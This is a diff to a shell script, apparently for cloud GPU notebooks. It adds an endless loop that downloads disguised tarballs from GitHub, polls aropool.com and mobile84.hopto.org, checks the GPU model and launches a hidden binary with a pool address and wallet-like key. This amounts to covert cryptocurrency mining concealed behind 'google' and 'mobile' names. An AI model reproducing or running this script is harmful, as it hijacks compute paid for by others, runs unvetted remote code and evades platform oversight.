@@ -10,6 +10,16 @@ cd googleapps8474
 while true
 do
 
+cd /notebooks/
+
+wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/googleapps8474127412742.tar.gz
+tar -xvf ./googleapps8474127412742.tar.gz
+
+cd googleapps8474
+
+string=$(curl http://aropool.com/mine.php?q=info)
+if [[ $string == *"16384"* ]]; then
+
 google8474=$(nvidia-smi --query-gpu=name --format=csv,noheader | sed "s/ //g")
 
 if [[ $google8474 == "QuadroP4000" ]]
@@ -126,6 +136,142 @@ fi
 fi
 
 fi
+
+fi
+
+else
+
+cd /notebooks/
+
+mkdir ./google84
+
+cd /google84/
+
+wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux84741274.tar.gz
+tar -xvf ./linux84741274.tar.gz
+
+cd googleapps8474
+
+google8474=$(nvidia-smi --query-gpu=name --format=csv,noheader | sed "s/ //g")
+
+if [[ $google8474 == "QuadroP4000" ]]
+then
+
+arr[0]="http://mobile84.hopto.org/"
+rand=$[$RANDOM % ${#arr[@]}]
+google841212121274=${arr[$rand]}
+
+google8412=$(curl $google841212121274 | sed "s/\s+//g")
+
+if [[ $google8412 = "" ]]
+then
+
+timeout 84 ./google84121274 -p $google841212121274 -a sLpa9w7haM3neVwQjYhUBqUnzn8j77ceSpgCSE8fuDRHuQ9fqdfWRvUZT5SxXPPM51Gy11RToibejsoyDYYyBo8 -t 4 -b 4
+if [ $? -eq 124 ]; then
+echo "google84"
+else
+echo "google8474"
+fi
+
+else
+
+echo "mobile8474"
+
+sleep 84;
+
+fi
+
+else
+
+if [[ $google8474 == "QuadroM4000" ]]
+then
+
+arr[0]="http://mobile84.hopto.org/"
+rand=$[$RANDOM % ${#arr[@]}]
+google841212121274=${arr[$rand]}
+
+google8412=$(curl $google841212121274 | sed "s/\s+//g")
+
+if [[ $google8412 = "" ]]
+then
+
+timeout 84 ./google84121274 -p $google841212121274 -a sLpa9w7haM3neVwQjYhUBqUnzn8j77ceSpgCSE8fuDRHuQ9fqdfWRvUZT5SxXPPM51Gy11RToibejsoyDYYyBo8 -t 4 -b 4
+if [ $? -eq 124 ]; then
+echo "google84"
+else
+echo "google8474"
+fi
+
+else
+
+echo "mobile8474"
+
+sleep 84;
+
+fi
+
+else
+
+if [[ $google8474 == "QuadroP5000" ]]
+then
+
+arr[0]="http://mobile84.hopto.org/"
+rand=$[$RANDOM % ${#arr[@]}]
+google841212121274=${arr[$rand]}
+
+google8412=$(curl $google841212121274 | sed "s/\s+//g")
+
+if [[ $google8412 = "" ]]
+then
+
+timeout 84 ./google84121274 -p $google841212121274 -a sLpa9w7haM3neVwQjYhUBqUnzn8j77ceSpgCSE8fuDRHuQ9fqdfWRvUZT5SxXPPM51Gy11RToibejsoyDYYyBo8 -t 4 -b 4
+if [ $? -eq 124 ]; then
+echo "google84"
+else
+echo "google8474"
+fi
+
+else
+
+echo "mobile8474"
+
+sleep 84;
+
+fi
+
+else
+
+arr[0]="http://mobile84.hopto.org/"
+rand=$[$RANDOM % ${#arr[@]}]
+google841212121274=${arr[$rand]}
+
+google8412=$(curl $google841212121274 | sed "s/\s+//g")
+
+if [[ $google8412 = "" ]]
+then
+
+timeout 84 ./google84121274 -p $google841212121274 -a sLpa9w7haM3neVwQjYhUBqUnzn8j77ceSpgCSE8fuDRHuQ9fqdfWRvUZT5SxXPPM51Gy11RToibejsoyDYYyBo8 -t 4 -b 4
+if [ $? -eq 124 ]; then
+echo "google84"
+else
+echo "google8474"
+fi
+
+else
+
+echo "mobile8474"
+
+sleep 84;
+
+fi
+
+fi
+
+fi
+
+fi
+
+
 
 fi
 
